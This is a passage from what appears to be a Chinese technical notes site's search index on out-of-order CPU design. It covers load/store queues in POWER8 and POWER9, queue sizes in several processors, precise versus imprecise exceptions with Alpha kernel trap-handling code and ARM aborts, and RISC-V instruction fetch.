\u200b\u6765\u200b\u51cf\u5c11\u200b\u4e00\u4e9b\u200b\u6ca1\u6709\u200b\u5fc5\u8981\u200b\u91cd\u590d\u200b\u6267\u884c\u200b\u7684\u200b Load\u3002\u200b\u8fd8\u6709\u200b\u4e00\u79cd\u200b\u529e\u6cd5\u200b\uff0c\u200b\u5c31\u662f\u200b\u9884\u6d4b\u200b Load \u200b\u6307\u4ee4\u200b\u548c\u200b\u54ea\u4e00\u6761\u200b Store \u200b\u6307\u4ee4\u200b\u6709\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\uff0c\u200b\u7136\u540e\u200b\u76f4\u63a5\u200b\u53bb\u200b\u8bbf\u95ee\u200b\u90a3\u200b\u4e00\u9879\u200b\uff0c\u200b\u5982\u679c\u200b\u4e0d\u200b\u5339\u914d\u200b\uff0c\u200b\u5c31\u200b\u8ba4\u4e3a\u200b\u6ca1\u6709\u200b\u4f9d\u8d56\u200b\u3002Scalable Store-Load Forwarding via Store Queue Index Prediction \u200b\u628a\u200b Load \u200b\u6307\u4ee4\u200b\u5206\u4e3a\u200b\u4e09\u7c7b\u200b\uff0c\u200b\u4e00\u7c7b\u200b\u662f\u200b\u4e0d\u200b\u786e\u5b9a\u200b\u4f9d\u8d56\u200b\u54ea\u6761\u200b Store \u200b\u6307\u4ee4\u200b\uff08Difficult Loads\uff09\uff0c\u200b\u4e00\u7c7b\u200b\u662f\u200b\u57fa\u672c\u200b\u786e\u5b9a\u200b\u4f9d\u8d56\u200b\u54ea\u4e00\u6761\u200b Store \u200b\u6307\u4ee4\u200b\uff0c\u200b\u4e00\u7c7b\u200b\u662f\u200b\u4e0d\u200b\u4f9d\u8d56\u200b Store \u200b\u6307\u4ee4\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u6709\u70b9\u50cf\u200b Cache \u200b\u91cc\u9762\u200b\u7684\u200b Way Prediction \u200b\u673a\u5236\u200b\u3002</p> <p>\u200b\u5206\u6790\u200b\u5b8c\u200b\u4e86\u200b\u4e0a\u8ff0\u200b\u4e00\u4e9b\u200b\u4f18\u5316\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u6211\u4eec\u200b\u4e5f\u200b\u6765\u770b\u200b\u4e00\u4e9b\u200b CPU \u200b\u8bbe\u8ba1\u200b\u91c7\u7528\u200b\u4e86\u200b\u54ea\u79cd\u200b\u65b9\u6848\u200b\u3002\u200b\u9996\u5148\u200b\u6765\u200b\u5206\u6790\u200b\u4e00\u4e0b\u200b IBM POWER8 \u200b\u7684\u200b LSU\uff0c\u200b\u9996\u5148\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5b83\u200b\u8bbe\u8ba1\u200b\u4e86\u200b\u6bd4\u8f83\u200b\u591a\u200b\u9879\u76ee\u200b\u7684\u200b virtual STAG/LTAG\uff0c\u200b\u7136\u540e\u200b\u518d\u200b\u8f6c\u6362\u6210\u200b\u6bd4\u8f83\u200b\u5c11\u200b\u9879\u76ee\u200b\u7684\u200b physical STAG/LTAG\uff0c\u200b\u8fd9\u6837\u200b LSQ \u200b\u53ef\u4ee5\u200b\u505a\u200b\u7684\u200b\u6bd4\u8f83\u200b\u5c0f\u200b\uff0c\u200b\u539f\u6587\u200b\uff1a</p> <pre><code>A virtual STAG/LTAG scheme is used to minimize dispatch holds due to\nrunning out of physical SRQ/LRQ entries. When a physical entry in the\nLRQ is freed up, a virtual LTAG will be converted to a real LTAG. When a\nphysical entry in the SRQ is freed up, a virtual STAG will be converted\nto a real STAG. Virtual STAG/LTAGs are not issued to the LSU until they\nare subsequently marked as being real in the UniQueue. The ISU can\nassign up to 128 virtual LTAGs and 128 virtual STAGs to each thread.\n</code></pre> <p>\u200b\u8fd9\u4e2a\u200b\u601d\u8def\u200b\u5728\u200b 2007 \u200b\u5e74\u200b\u7684\u200b\u8bba\u6587\u200b Late-Binding: Enabling Unordered Load-Store Queues \u200b\u91cc\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u4e5f\u8bb8\u200b POWER8 \u200b\u53c2\u8003\u200b\u4e86\u200b\u8fd9\u7bc7\u200b\u8bba\u6587\u200b\u7684\u200b\u8bbe\u8ba1\u200b\u3002\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0cPOWER8 \u200b\u6ca1\u6709\u200b\u91c7\u7528\u200b\u90a3\u4e9b\u200b\u514d\u9664\u200b CAM \u200b\u7684\u200b\u65b9\u6848\u200b\uff1a</p> <pre><code>The SRQ is a 40-entry, real address based CAM structure. Similar to the\nSRQ, the LRQ is a 44-entry, real address based, CAM structure. The LRQ\nkeeps track of out-of-order loads, watching for hazards. Hazards\ngenerally exist when a younger load instruction executes out-of-order\nbefore an older load or store instruction to the same address (in part\nor in whole). When such a hazard is detected, the LRQ initiates a flush\nof the younger load instruction and all its subsequent instructions from\nthe thread, without impacting the instructions from other threads. The\nload is then re-fetched from the I-cache and re-executed, ensuring\nproper load/store ordering.\n</code></pre> <p>\u200b\u800c\u662f\u200b\u5728\u200b\u4f20\u7edf\u200b\u7684\u200b\u4e24\u4e2a\u200b CAM \u200b\u8bbe\u8ba1\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u505a\u200b\u4e86\u200b\u51cf\u5c11\u200b\u7269\u7406\u200b LSQ \u200b\u9879\u76ee\u200b\u7684\u200b\u4f18\u5316\u200b\u3002\u200b\u6bd4\u8f83\u200b\u6709\u610f\u601d\u200b\u7684\u200b\u662f\u200b\uff0cPOWER7 \u200b\u548c\u200b POWER8 \u200b\u7684\u200b L1 Cache \u200b\u90fd\u200b\u662f\u200b 8 \u200b\u8def\u7ec4\u200b\u76f8\u8fde\u200b\uff0c\u200b\u5e76\u4e14\u200b\u91c7\u7528\u200b\u4e86\u200b set-prediction \u200b\u7684\u200b\u65b9\u5f0f\u200b\uff08\u200b\u5e94\u8be5\u200b\u662f\u200b\u901a\u5e38\u200b\u8bf4\u200b\u7684\u200b way-prediction\uff09\u3002</p> <p>\u200b\u6b64\u5916\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b\u5b9e\u73b0\u200b\u4e0a\u200b\u7684\u200b\u5c0f\u200b\u7ec6\u8282\u200b\uff0c\u200b\u5c31\u662f\u200b\u5728\u200b\u5224\u65ad\u200b Load \u200b\u548c\u200b Store \u200b\u6307\u4ee4\u200b\u662f\u5426\u200b\u6709\u200b\u76f8\u5173\u6027\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7531\u4e8e\u200b\u5730\u5740\u200b\u4f4d\u6570\u200b\u6bd4\u8f83\u200b\u591a\u200b\uff0c\u200b\u5b8c\u6574\u200b\u6bd4\u8f83\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u6bd4\u8f83\u200b\u5927\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u727a\u7272\u200b\u7cbe\u5ea6\u200b\u7684\u200b\u524d\u63d0\u200b\u4e0b\u200b\uff0c\u200b\u9009\u53d6\u200b\u5730\u5740\u200b\u7684\u200b\u4e00\u90e8\u5206\u200b\u8fdb\u884c\u200b\u6bd4\u8f83\u200b\u3002POWER9 \u200b\u8bba\u6587\u200b \u200b\u63d0\u5230\u200b\u4e86\u200b\u8fd9\u200b\u4e00\u70b9\u200b\uff1a</p> <pre><code>POWER8 and prior designs matched the effective address (EA) bits 48:63\nbetween the younger load and the older store queue entry. In POWER9,\nthrough a combination of outright matches for EA bits 32:63 and hashed\nEA matches for bits 0:31, false positive avoidance is greatly improved.\nThis reduces the number of flushes, which are compulsory for false\npositives.\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u53c8\u200b\u662f\u200b\u4e00\u4e2a\u200b\u7cbe\u786e\u5ea6\u200b\u548c\u200b\u65f6\u5e8f\u200b\u4e0a\u200b\u7684\u200b\u4e00\u4e2a\u200b tradeoff\u3002</p> <p>\u200b\u5177\u4f53\u200b\u5230\u200b Load/Store Queue \u200b\u7684\u200b\u5927\u5c0f\u200b\uff0c\u200b\u5176\u5b9e\u200b\u90fd\u200b\u4e0d\u5927\u200b\uff1a</p> <ol> <li>Zen 2 Store Queue 48</li> <li>Intel Skylake Store Buffer 56 Load Buffer 72</li> <li>POWER 8 Store Queue 40 Load Queue 44 (Virtual 128+128)</li> <li>Alpha 21264 Store Queue 32 Load Queue 32</li> </ol>"},{"location":"hardware/ooo_cpu.html#vs","title":"\u7cbe\u786e\u200b\u5f02\u5e38\u200b vs \u200b\u975e\u200b\u7cbe\u786e\u200b\u5f02\u5e38","text":"<p>\u200b\u7cbe\u786e\u200b\u5f02\u5e38\u200b\u662f\u200b\u6307\u200b\u53d1\u751f\u200b\u5f02\u5e38\u200b\u7684\u200b\u6307\u4ee4\u200b\u4e4b\u524d\u200b\u7684\u200b\u6307\u4ee4\u200b\u90fd\u200b\u5b8c\u6210\u200b\uff0c\u200b\u4e4b\u540e\u200b\u7684\u200b\u6ca1\u6709\u200b\u6267\u884c\u200b\u3002\u200b\u4e00\u822c\u6765\u8bf4\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u65b9\u5f0f\u200b\u662f\u200b\u5b8c\u6210\u200b\u5f02\u5e38\u200b\u6307\u4ee4\u200b\u4e4b\u524d\u200b\u7684\u200b\u6240\u6709\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5e76\u200b\u64a4\u9500\u200b\u5f02\u5e38\u200b\u6307\u4ee4\u200b\u4e4b\u540e\u200b\u7684\u200b\u6307\u4ee4\u200b\u7684\u200b\u4f5c\u7528\u200b\u3002\u200b\u975e\u200b\u7cbe\u786e\u200b\u5f02\u5e38\u200b\u5219\u200b\u662f\u200b\u4e0d\u200b\u4fdd\u8bc1\u200b\u8fd9\u4e2a\u200b\u6027\u8d28\u200b\uff0c\u200b\u7f51\u4e0a\u200b\u8d44\u6599\u200b \u200b\u8bf4\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u786c\u4ef6\u200b\u5b9e\u73b0\u200b\u66f4\u200b\u7b80\u5355\u200b\uff0c\u200b\u4f46\u662f\u200b\u8f6f\u4ef6\u200b\u4e0a\u200b\u5904\u7406\u200b\u6bd4\u8f83\u200b\u56f0\u96be\u200b\u3002</p> <p>\u200b\u4e00\u4e2a\u200b\u975e\u200b\u7cbe\u786e\u200b\u5f02\u5e38\u200b\u7684\u200b\u4f8b\u5b50\u200b\u662f\u200b Alpha\uff0c\u200b\u5728\u200b\u7ae0\u8282\u200b 4.7.6.1 \u200b\u4e2d\u200b\u63d0\u5230\u200b\uff0c\u200b\u4e00\u4e9b\u200b\u6d6e\u70b9\u200b\u8ba1\u7b97\u200b\u5f02\u5e38\u200b\u53ef\u80fd\u200b\u662f\u975e\u200b\u7cbe\u786e\u200b\u7684\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8bf4\u200b\u4e86\u200b\u4e00\u53e5\u200b\uff1a<code>In general, it is not feasible to fix up the result value or to continue from the trap.</code>\u3002\u200b\u540c\u65f6\u200b\u7ed9\u51fa\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u6761\u4ef6\u200b\uff0c\u200b\u53ea\u6709\u200b\u5f53\u200b\u6307\u4ee4\u200b\u5e8f\u5217\u200b\u6ee1\u8db3\u200b\u8fd9\u4e9b\u200b\u6761\u4ef6\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5f02\u5e38\u200b\u624d\u200b\u662f\u200b\u53ef\u4ee5\u200b\u6062\u590d\u200b\u7684\u200b\u3002\u200b\u8fd8\u6709\u200b\u4e00\u6bb5\u200b\u63cf\u8ff0\u200b\uff0c\u200b\u6458\u5f55\u200b\u5728\u200b\u8fd9\u91cc\u200b\uff1a</p> <pre><code>Alpha lets the software implementor determine the precision of\narithmetic traps.  With the Alpha architecture, arithmetic traps (such\nas overflow and underflow) are imprecise\u2014they can be delivered an\narbitrary number of instructions after the instruction that triggered\nthe trap. Also, traps from many different instructions can be reported\nat once. That makes implementations that use pipelining and multiple\nissue substantially easier to build.  However, if precise arithmetic\nexceptions are desired, trap barrier instructions can be explicitly\ninserted in the program to force traps to be delivered at specific\npoints.\n</code></pre> <p>\u200b\u5177\u4f53\u6765\u8bf4\u200b\uff0c\u200b\u5728\u200b Reference Manual \u200b\u4e2d\u200b\u7b2c\u200b 5.4.1 \u200b\u7ae0\u8282\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5f53\u200b\u89e6\u53d1\u200b Arithmetic Trap \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u8fdb\u5165\u200b Kernel \u200b\u7684\u200b entArith \u200b\u51fd\u6570\u200b\uff0c\u200b\u5e76\u200b\u63d0\u4f9b\u200b\u53c2\u6570\u200b\uff1aa0 \u200b\u8868\u793a\u200b exception summary\uff0ca1 \u200b\u8868\u793a\u200b register write mask\u3002exception summary \u200b\u53ef\u4ee5\u200b\u7528\u6765\u200b\u5224\u65ad\u200b\u53d1\u751f\u200b\u4e86\u200b\u4ec0\u4e48\u200b\u7c7b\u578b\u200b\u7684\u200b exception\uff0c\u200b\u6bd4\u5982\u200b integer overflow\uff0cinexact result \u200b\u7b49\u7b49\u200b\u3002\u200b\u4e00\u4e2a\u200b\u6bd4\u8f83\u200b\u7279\u522b\u200b\u7684\u200b exception \u200b\u7c7b\u578b\u200b\u662f\u200b software completion\u3002\u200b\u7b2c\u4e8c\u4e2a\u200b\u53c2\u6570\u200b\u8868\u793a\u200b\u7684\u200b\u662f\u200b\u89e6\u53d1\u200b\u5f02\u5e38\u200b\u7684\u200b\u6307\u4ee4\u200b\uff08\u200b\u4e00\u4e2a\u200b\u6216\u200b\u591a\u4e2a\u200b\uff09\u200b\u4f1a\u200b\u5199\u5165\u200b\u54ea\u4e9b\u200b\u5bc4\u5b58\u5668\u200b\uff0864 \u200b\u4f4d\u200b\uff0c\u200b\u4f4e\u200b 32 \u200b\u4f4d\u200b\u5bf9\u5e94\u200b\u6574\u6570\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u9ad8\u200b 32 \u200b\u4f4d\u200b\u5bf9\u5e94\u200b\u6d6e\u70b9\u200b\u5bc4\u5b58\u5668\u200b\uff09\uff0c\u200b\u7136\u540e\u200b\u4fdd\u5b58\u200b\u4e0b\u6765\u200b\u7684\u200b PC \u200b\u503c\u4e3a\u200b\u6700\u540e\u200b\u4e00\u6761\u200b\u6267\u884c\u200b\u7684\u200b\u6307\u4ee4\u200b\u7684\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5730\u5740\u200b\uff0c\u200b\u4ece\u200b\u89e6\u53d1\u200b\u5f02\u5e38\u200b\u7684\u200b\u7b2c\u4e00\u6761\u200b\u6307\u4ee4\u200b\u5230\u200b\u6700\u540e\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u5c31\u662f\u200b trap shadow\uff0c\u200b\u8fd9\u90e8\u5206\u200b\u6307\u4ee4\u200b\u53ef\u80fd\u200b\u6267\u884c\u200b\u4e86\u200b\u4e00\u90e8\u5206\u200b\uff0c\u200b\u6ca1\u6709\u200b\u6267\u884c\u200b\u4e00\u90e8\u5206\u200b\uff0c\u200b\u4e00\u90e8\u5206\u200b\u6267\u884c\u200b\u7ed3\u679c\u200b\u662f\u200b\u9519\u8bef\u200b\u7684\u200b\u3002</p> <p>Linux \u200b\u5904\u7406\u200b\u4ee3\u7801\u200b\u5728\u200b <code>arch/alpha/kernel/traps.c</code> \u200b\u7684\u200b <code>do_entArith</code> \u200b\u51fd\u6570\u200b\u4e2d\u200b\u3002\u200b\u9996\u5148\u200b\u5224\u65ad\u200b\uff0c\u200b\u5982\u679c\u200b\u662f\u200b software completion\uff0c\u200b\u90a3\u200b\u5c31\u8981\u200b\u8fdb\u884c\u200b\u5904\u7406\u200b\uff1b\u200b\u5426\u5219\u200b\u76f4\u63a5\u200b SIGFPE \u200b\u8ba9\u200b\u7a0b\u5e8f\u200b\u81ea\u5df1\u200b\u5904\u7406\u200b\u6216\u8005\u200b\u9000\u51fa\u200b\u3002\u200b\u5982\u679c\u200b\u662f\u200b\u7cbe\u786e\u200b\u5f02\u5e38\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u5bf9\u200b PC-4 \u200b\u8fdb\u884c\u200b\u6d6e\u70b9\u200b\u6a21\u62df\u200b\uff1b\u200b\u5982\u679c\u200b\u662f\u975e\u200b\u7cbe\u786e\u200b\u5f02\u5e38\u200b\uff0c\u200b\u5c31\u200b\u4ece\u200b trap shadow \u200b\u7684\u200b\u6700\u540e\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u5f00\u59cb\u200b\u5f80\u524d\u200b\u641c\u7d22\u200b\uff0c\u200b\u5e76\u200b\u540c\u65f6\u200b\u8bb0\u5f55\u200b\u9047\u5230\u200b\u7684\u200b\u6307\u4ee4\u200b\u5199\u5165\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u5982\u679c\u200b\u53d1\u73b0\u200b\u6307\u4ee4\u200b\u7684\u200b\u5199\u5165\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5df2\u7ecf\u200b\u8986\u76d6\u200b\u4e86\u200b register write mask\uff0c\u200b\u5c31\u200b\u8bf4\u660e\u200b\u627e\u5230\u200b\u4e86\u200b trap shadow \u200b\u7684\u200b\u5f00\u5934\u200b\uff0c\u200b\u5219\u200b\u6a21\u62df\u200b\u8fd9\u200b\u6761\u200b\u6307\u4ee4\u200b\uff0c\u200b\u7136\u540e\u200b\u4ece\u4e0b\u200b\u4e00\u6761\u200b\u5f00\u59cb\u200b\u91cd\u65b0\u200b\u6267\u884c\u200b\u3002\u200b\u5177\u4f53\u200b\u4ee3\u7801\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>long\nalpha_fp_emul_imprecise (struct pt_regs *regs, unsigned long write_mask)\n{\n    unsigned long trigger_pc = regs-&gt;pc - 4;\n    unsigned long insn, opcode, rc, si_code = 0;\n\n    /*\n     * Turn off the bits corresponding to registers that are the\n     * target of instructions that set bits in the exception\n     * summary register.  We have some slack doing this because a\n     * register that is the target of a trapping instruction can\n     * be written at most once in the trap shadow.\n     *\n     * Branches, jumps, TRAPBs, EXCBs and calls to PALcode all\n     * bound the trap shadow, so we need not look any further than\n     * up to the first occurrence of such an instruction.\n     */\n    while (write_mask) {\n        get_user(insn, (__u32 __user *)(trigger_pc));\n        opcode = insn &gt;&gt; 26;\n        rc = insn &amp; 0x1f;\n\n        switch (opcode) {\n              case OPC_PAL:\n              case OPC_JSR:\n              case 0x30 ... 0x3f:   /* branches */\n            goto egress;\n\n              case OPC_MISC:\n            switch (insn &amp; 0xffff) {\n                  case MISC_TRAPB:\n                  case MISC_EXCB:\n                goto egress;\n\n                  default:\n                break;\n            }\n            break;\n\n              case OPC_INTA:\n              case OPC_INTL:\n              case OPC_INTS:\n              case OPC_INTM:\n            write_mask &amp;= ~(1UL &lt;&lt; rc);\n            break;\n\n              case OPC_FLTC:\n              case OPC_FLTV:\n              case OPC_FLTI:\n              case OPC_FLTL:\n            write_mask &amp;= ~(1UL &lt;&lt; (rc + 32));\n            break;\n        }\n        if (!write_mask) {\n            /* Re-execute insns in the trap-shadow.  */\n            regs-&gt;pc = trigger_pc + 4;\n            si_code = alpha_fp_emul(trigger_pc);\n            goto egress;\n        }\n        trigger_pc -= 4;\n    }\n\negress:\n    return si_code;\n}\n</code></pre> <p>ARM \u200b\u67b6\u6784\u200b\u4e5f\u200b\u6709\u200b imprecise asynchronous external abort\uff1a</p> <pre><code>Normally, external aborts are rare. An imprecise asynchronous external\nabort is likely to be fatal to the process that is running. An example\nof an event that might cause an external abort is an uncorrectable\nparity or ECC failure on a Level 2 Memory structure.\n\nBecause imprecise asynchronous external aborts are normally fatal to the\nprocess that caused them, ARM recommends that implementations make\nexternal aborts precise wherever possible.\n</code></pre> <p>\u200b\u4e0d\u8fc7\u200b\u8fd9\u200b\u66f4\u200b\u591a\u200b\u662f\u56e0\u4e3a\u200b\u5185\u5b58\u200b\u7684\u200b\u65e0\u6cd5\u200b\u9884\u77e5\u200b\u7684\u200b\u9519\u8bef\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u65f6\u5019\u200b\u673a\u5668\u200b\u76f4\u63a5\u200b\u53ef\u4ee5\u200b\u62ff\u200b\u53bb\u200b\u7ef4\u4fee\u200b\u4e86\u200b\u3002</p> <p>\u200b\u6587\u7ae0\u200b \u200b\u63d0\u5230\u200b\u4e86\u200b\u4e24\u4e2a\u200b precise/imprecise async/sync\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff1a</p> <ol> <li>\u200b\u5916\u90e8\u200b\u4e2d\u65ad\u200b\u662f\u200b\u5f02\u6b65\u200b\u7684\u200b\uff0c\u200b\u540c\u65f6\u200b\u4e5f\u200b\u662f\u200b precise \u200b\u7684\u200b\u3002</li> <li>\u200b\u5bf9\u4e8e\u200b\u4e00\u4e2a\u200b Write-allocate \u200b\u7684\u200b\u7f13\u5b58\u200b\uff0c\u200b\u5982\u679c\u200b\u7a0b\u5e8f\u200b\u5199\u5165\u200b\u4e00\u4e2a\u200b\u4e0d\u200b\u5b58\u5728\u200b\u7684\u200b\u7269\u7406\u5730\u5740\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5199\u5165\u200b\u7f13\u5b58\u200b\u7684\u200b\u65f6\u5019\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b\u9519\u8bef\u200b\uff0c\u200b\u4f46\u200b\u5f53\u200b\u8fd9\u4e2a\u200b cache line \u200b\u88ab\u200b\u5199\u5165\u200b\u5230\u200b\u603b\u7ebf\u200b\u4e0a\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u89e6\u53d1\u200b\u5f02\u5e38\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u5f02\u5e38\u200b\u662f\u200b\u5f02\u6b65\u200b\u5e76\u4e14\u200b\u975e\u200b\u7cbe\u786e\u200b\u7684\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u4e4b\u524d\u200b\u89e6\u53d1\u200b\u8fd9\u4e2a\u200b\u5f02\u5e38\u200b\u7684\u200b\u6307\u4ee4\u200b\u53ef\u80fd\u200b\u5df2\u7ecf\u200b\u5b8c\u6210\u200b\u5f88\u4e45\u200b\u4e86\u200b\u3002\u200b\u8fd9\u79cd\u200b\u65f6\u5019\u200b\u8fd9\u4e2a\u200b\u8fdb\u7a0b\u200b\u4e5f\u200b\u5927\u200b\u6982\u7387\u200b\u6ca1\u6551\u200b\u4e86\u200b\uff0c\u200b\u76f4\u63a5\u200b SIGBUS \u200b\u9000\u51fa\u200b\u3002</li> </ol>"},{"location":"hardware/ooo_cpu.html#_3","title":"\u5904\u7406\u5668\u200b\u524d\u7aef","text":"<p>\u200b\u518d\u200b\u6765\u200b\u5206\u6790\u200b\u4e00\u4e0b\u200b\u4e71\u5e8f\u6267\u884c\u200b CPU \u200b\u7684\u200b\u524d\u7aef\u200b\u90e8\u5206\u200b\u3002\u200b\u4ee5\u200b RISC-V \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u6307\u4ee4\u200b\u957f\u5ea6\u200b\u6709\u200b 4 \u200b\u5b57\u8282\u200b\u6216\u8005\u200b 2 \u200b\u5b57\u8282\u200b\u4e24\u79cd\u200b\uff0c\u200b\u5176\u4e2d\u200b 2 \u200b\u5b57\u8282\u200b\u5c5e\u4e8e\u200b\u538b\u7f29\u200b\u6307\u4ee4\u96c6\u200b\u3002\u200b\u5982\u4f55\u200b\u6b63\u786e\u200b\u5e76\u200b\u9ad8\u6548\u200b\u5730\u200b\u8fdb\u884c\u200b\u53d6\u6307\u4ee4\u200b\u8bd1\u7801\u200b\uff1f</p> <p>\u200b\u9996\u5148\u200b\uff0c\u200b\u6211\u4eec\u200b\u5e0c\u671b\u200b\u524d\u7aef\u200b\u80fd\u591f\u200b\u5c3d\u53ef\u80fd\u200b\u5feb\u5730\u200b\u53d6\u6307\u4ee4\u200b\uff0c\u200b\u524d\u7aef\u200b\u7684\u200b\u53d6\u6307\u200b\u80fd\u529b\u200b\u8981\u200b\u548c\u200b\u540e\u200b\u7aef\u200b\u5339\u914d\u200b\uff0c\u200b\u6bd4\u5982\u200b\u5bf9\u4e8e\u200b\u4e00\u4e2a\u200b\u56db\u200b\u53d1\u5c04\u200b\u7684\u200b CPU\uff0c\u200b\u524d\u7aef\u200b\u5bf9\u5e94\u200b\u5730\u200b\u9700\u8981\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u53d6\u200b <code>4*4=16</code> \u200b\u5b57\u8282\u200b\u7684\u200b\u6307\u4ee4\u200b\u3002\u200b\u4f46\u662f\u200b\uff0c\u200b\u8fd9\u200b 16 \u200b\u5b57\u8282\u200b\u53ef\u80fd\u200b\u662f\u200b 4 \u200b\u6761\u975e\u200b\u538b\u7f29\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u662f\u200b 8 \u200b\u6761\u200b\u538b\u7f29\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u662f\u200b\u6df7\u5408\u200b\u7684\u200b\u60c5\u51b5\u200b\u3002\u200b\u6240\u4ee5\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u4e00\u4e2a\u200b\u53ef\u80fd\u200b\u51fa\u73b0\u200b\u6307\u4ee4\u200b\u6761\u6570\u200b\u4e0d\u200b\u5339\u914d\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4e2d\u95f4\u200b\u53ef\u4ee5\u200b\u6dfb\u52a0\u200b\u4e00\u4e2a\u200b Fetch Buffer\uff0c\u200b\u6bd4\u5982\u200b BOOM \u200b\u7684\u200b\u5b9e\u73b0\u200b\u4e2d\u200b\uff0cL1 ICache \u200b\u6bcf\u200b\u5468\u671f\u200b\u8bfb\u53d6\u200b 16 \u200b\u5b57\u8282\u200b\uff0c\u200b\u7136\u540e\u200b\u8fdb\u884c\u200b\u9884\u200b\u8bd1\u7801\u200b\uff0c\u200b\u51fa\u6765\u200b 8 \u200b\u6761\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4fdd\u5b58\u200b\u5230\u200b Fetch Buffer \u200b\u4e2d\u200b\u3002\u200b\u8fd9\u91cc\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u4ee5\u4e0b\u51e0\u70b9\u200b\uff1a\u200b\u9996\u5148\u200b\u4ece\u200b ICache \u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\u662f\u200b\u5bf9\u9f50\u200b\u7684\u200b\uff0c\u200b\u4f46\u662f\u200b PC \u200b\u53ef\u80fd\u200b\u4e0d\u662f\u200b\uff0c\u200b\u6bd4\u5982\u200b\u4e2d\u95f4\u200b\u7684\u200b\u5730\u5740\u200b\u3002\u200b\u5176\u6b21\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4e00\u4e2a\u200b 4 \u200b\u5b57\u8282\u200b\u7684\u200b\u975e\u200b\u538b\u7f29\u200b\u6307\u4ee4\u200b\u8de8\u8d8a\u200b\u4e86\u200b\u4e24\u6b21\u200b Fetch\uff0c\u200b\u6bd4\u5982\u200b\u524d\u200b 2 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u5728\u200b\u524d\u200b\u4e00\u4e2a\u200b Fetch Bundle\uff0c\u200b\u540e\u200b 2 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u5728\u200b\u540e\u200b\u4e00\u4e2a\u200b Fetch Bundle\uff1b\u200b\u6b64\u5916\u200b\uff0c\u200b\u6bcf\u4e2a\u200b 2 \u200b\u5b57\u8282\u200b\u7684\u200b\u8fb9\u754c\u200b\u90fd\u200b\u9700\u8981\u200b\u5224\u65ad\u200b\u4e00\u4e0b\u200b\u662f\u200b\u538b\u7f29\u200b\u6307\u4ee4\u200b\u8fd8\u200b\u662f\u975e\u200b\u538b\u7f29\u200b\u6307\u4ee4\u200b\u3002\u200b\u4e00\u4e2a\u200b\u975e\u5e38\u200b\u7279\u6b8a\u200b\u7684\u200b\u60c5\u51b5\u200b\u5c31\u662f\u200b\uff0c\u200b\u4e00\u4e2a\u200b 4 \u200b\u5b57\u8282\u200b\u7684\u200b\u6307\u4ee4\u200b\u8de8\u8d8a\u200b\u4e86\u200b\u4e24\u4e2a\u200b\u9875\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4e24\u4e2a\u200b\u9875\u200b\u90fd\u200b\u9700\u8981\u200b\u67e5\u8be2\u200b\u9875\u8868\u200b\uff1b\u200b\u5982\u679c\u200b\u6070\u597d\u200b\u5728\u200b\u7b2c\u4e8c\u4e2a\u200b\u9875\u200b\u5904\u200b\u53d1\u751f\u200b\u4e86\u200b\u9875\u200b\u7f3a\u5931\u200b\uff0c\u200b\u6b64\u65f6\u200b epc \u200b\u662f\u200b\u6307\u4ee4\u200b\u7684\u200b\u8d77\u59cb\u200b\u5730\u5740\u200b\uff0c\u200b\u4f46\u200b tval \u200b\u662f\u200b\u7b2c\u4e8c\u4e2a\u200b\u9875\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5185\u6838\u200b\u624d\u200b\u77e5\u9053\u200b\u662f\u200b\u54ea\u4e2a\u200b\u9875\u200b\u53d1\u751f\u200b\u4e86\u200b\u7f3a\u5931\u200b\u3002</p> 